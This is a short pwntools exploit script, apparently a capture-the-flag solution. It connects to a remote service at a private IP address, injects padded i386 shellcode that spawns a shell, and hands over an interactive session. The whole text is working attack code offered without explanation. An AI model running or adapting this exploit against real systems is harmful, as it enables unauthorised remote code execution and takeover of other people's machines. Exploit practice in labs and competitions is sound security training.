from pwn import *

r = remote("10.214.160.13", 11003)
context.log_level = "debug"
context(os="linux", arch="i386")
shellcode = asm(shellcraft.sh())
r.recvuntil(b"as assemble instruction")
r.sendline(shellcode + b"A" * (35 - len(shellcode)))
r.interactive()
